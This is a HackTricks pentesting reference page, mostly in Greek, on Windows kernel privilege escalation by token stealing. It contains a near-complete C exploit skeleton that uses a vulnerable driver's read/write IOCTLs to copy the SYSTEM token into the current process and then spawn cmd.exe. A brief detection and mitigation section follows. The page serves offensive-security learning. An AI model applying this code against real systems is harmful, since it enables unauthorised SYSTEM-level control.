# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Επισκόπηση

Αν ένας ευάλωτος driver εκθέτει ένα IOCTL που δίνει σε έναν επιτιθέμενο αυθαίρετες primitive ανάγνωσης και/ή εγγραφής στον kernel, η αύξηση δικαιωμάτων σε NT AUTHORITY\SYSTEM μπορεί συχνά να επιτευχθεί με το κλέψιμο του SYSTEM access token. Η τεχνική αντιγράφει τον δείκτη Token από το EPROCESS μιας διεργασίας SYSTEM στο EPROCESS της τρέχουσας διεργασίας.

Γιατί δουλεύει:
- Κάθε διεργασία έχει μια δομή EPROCESS που περιέχει (μεταξύ άλλων πεδίων) ένα Token (στην πραγματικότητα ένα EX_FAST_REF σε ένα αντικείμενο token).
- Η διεργασία SYSTEM (PID 4) κρατάει ένα token με όλα τα privileges ενεργοποιημένα.
- Η αντικατάσταση του EPROCESS.Token της τρέχουσας διεργασίας με τον δείκτη token του SYSTEM κάνει την τρέχουσα διεργασία να τρέξει ως SYSTEM αμέσως.

> Τα offsets στο EPROCESS διαφέρουν ανά έκδοση των Windows. Προσδιορίστε τα δυναμικά (symbols) ή χρησιμοποιήστε constants ανά έκδοση. Επίσης θυμηθείτε ότι το EPROCESS.Token είναι EX_FAST_REF (τα κατώτερα 3 bit είναι flags για το reference count).

## Υψηλού επιπέδου βήματα

1) Εντοπίστε τη βάση του ntoskrnl.exe και επιλύστε τη διεύθυνση του PsInitialSystemProcess.
- Από user mode, χρησιμοποιήστε NtQuerySystemInformation(SystemModuleInformation) ή EnumDeviceDrivers για να πάρετε τις βάσεις των φορτωμένων drivers.
- Προσθέστε το offset του PsInitialSystemProcess (από symbols/reversing) στη βάση του kernel για να πάρετε τη διεύθυνσή του.
2) Διαβάστε τον δείκτη στο PsInitialSystemProcess → αυτός είναι ένας kernel pointer στο EPROCESS του SYSTEM.
3) Από το EPROCESS του SYSTEM, διαβάστε τα offsets UniqueProcessId και ActiveProcessLinks για να διασχίσετε τη διπλά συνδεδεμένη λίστα των δομών EPROCESS (ActiveProcessLinks.Flink/Blink) μέχρι να βρείτε το EPROCESS του οποίου το UniqueProcessId ισούται με GetCurrentProcessId(). Κρατήστε και τα δύο:
- EPROCESS_SYSTEM (για το SYSTEM)
- EPROCESS_SELF (για την τρέχουσα διεργασία)
4) Διάβασε την τιμή του token του SYSTEM: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Μάσκαρε τα κατώτερα 3 bit: Token_SYS_masked = Token_SYS & ~0xF (συνήθως ~0xF ή ~0x7 ανάλογα με το build; σε x64 τα κατώτερα 3 bit χρησιμοποιούνται — μάσκα 0xFFFFFFFFFFFFFFF8).
5) Επιλογή A (συνηθισμένη): Διατήρησε τα κατώτερα 3 bit από το τρέχον token σου και κόλλησέ τα πάνω στον pointer του SYSTEM για να διατηρηθεί συνεπές το ενσωματωμένο ref count.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Γράψε το Token_NEW πίσω σε (EPROCESS_SELF + TokenOffset) χρησιμοποιώντας το kernel write primitive σου.
7) Η τρέχουσα διεργασία σου είναι τώρα SYSTEM. Προαιρετικά spawnάρισε ένα νέο cmd.exe ή powershell.exe για επιβεβαίωση.

## Ψευδοκώδικας

Παρακάτω είναι ένα skeleton που χρησιμοποιεί μόνο δύο IOCTLs από έναν ευάλωτο driver, ένα για 8-byte kernel read και ένα για 8-byte kernel write. Αντικαταστήστε με το interface του δικού σας driver.
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Σημειώσεις:
- Offsets: Use WinDbg’s `dt nt!_EPROCESS` with the target’s PDBs, or a runtime symbol loader, to get correct offsets. Do not hardcode blindly.
- Mask: Στο x64 το token είναι ένα EX_FAST_REF· τα 3 χαμηλότερα bits είναι reference count bits. Η διατήρηση των αρχικών χαμηλών bits από το token σας αποφεύγει immediate refcount inconsistencies.
- Stability: Προτιμήστε να elevate την τρέχουσα διεργασία· αν ανεβάσετε έναν short-lived helper μπορεί να χάσετε SYSTEM όταν τερματιστεί.

## Ανίχνευση & αντιμετώπιση
- Η φόρτωση unsigned ή untrusted third‑party drivers που εκθέτουν ισχυρά IOCTLs είναι η ριζική αιτία.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard, και κανόνες Attack Surface Reduction μπορούν να αποτρέψουν τη φόρτωση ευάλωτων drivers.
- Το EDR μπορεί να παρακολουθεί για suspicious IOCTL sequences που υλοποιούν arbitrary read/write και για token swaps.

## References
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
